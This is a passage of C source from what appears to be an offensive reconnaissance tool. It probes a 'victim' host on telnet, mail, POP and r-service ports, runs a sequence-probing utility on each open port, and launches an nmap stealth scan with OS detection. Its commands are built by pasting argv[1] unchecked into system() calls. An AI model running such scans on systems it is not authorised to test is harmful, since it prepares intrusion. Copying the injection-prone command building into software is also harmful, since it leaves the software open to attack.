if ((sockfd=connect_tcp(victim,23)) > 0)
{
printf("On port 23: \n");
strcpy(s1, "seq -h ");
strcat(s1, argv[1]);
strcat(s1, " -p 23 -i ppp0");
system(s1);
}
if ((sockfd=connect_tcp(victim,25)) > 0)
{
printf("On port 25: \n");
strcpy(s2, "seq -h ");
strcat(s2, argv[1]);
strcat(s2, " -p 25 -i ppp0");
system(s2);
}
if ((sockfd=connect_tcp(victim,110)) > 0)
{
printf("On port 110: \n");
strcpy(s3, "seq -h ");
strcat(s3, argv[1]);
strcat(s3, " -p 110 -i ppp0");
system(s3);
}
if ((sockfd=connect_tcp(victim,513)) > 0)
{
printf("On port 513: \n");
strcpy(s4, "seq -h ");
strcat(s4, argv[1]);
strcat(s4, " -p 513 -i ppp0");
system(s4);
}
if ((sockfd=connect_tcp(victim,514)) > 0)
{
printf("On port 514: \n");
strcpy(s5, "seq -h ");
strcat(s5, argv[1]);
strcat(s5, " -p 514 -i ppp0");
system(s5);
}
printf("-------------------------------------------------------------\n");
printf("+++++++++++++++++++++++++++++\n");
printf("Nmap scan & detecte OS\n");
printf("+++++++++++++++++++++++++++++\n");
printf("-------------------------------------------------------------\n");
strcpy(nmap, "nmap -sS -v -O ");
strcat(nmap, argv[1]);
system(nmap);
printf("-------------------------------------------------------------\n");
}

/* ecrit dans une connection */

int fdprintf(int dafd,char *fmt,...)
{
char mybuffer[4096];
va_list va;

va_start(va,fmt);
vsnprintf(mybuffer,4096,fmt,va);
write(dafd,mybuffer,strlen(mybuffer));
va_end(va);
return(1);
}

/* connection tcp usage: host port */

int connect_tcp(struct in_addr addr,unsigned short port)
{
struct sockaddr_in serv;
int thesock,flags;

thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
bzero(&serv,sizeof(serv));
memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
serv.sin_port=htons(port);
serv.sin_family=AF_INET;
if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
  return(-1);
else
  return(thesock);
}

/* gethostname */
int host_to_ip(char *hostname,struct in_addr *addr)
{
struct hostent *res;

res=gethostbyname(hostname);
if (res==NULL)
  return(0);
memcpy((char *)addr,res->h_addr,res->h_length);
return(1);
}
/* EOF */
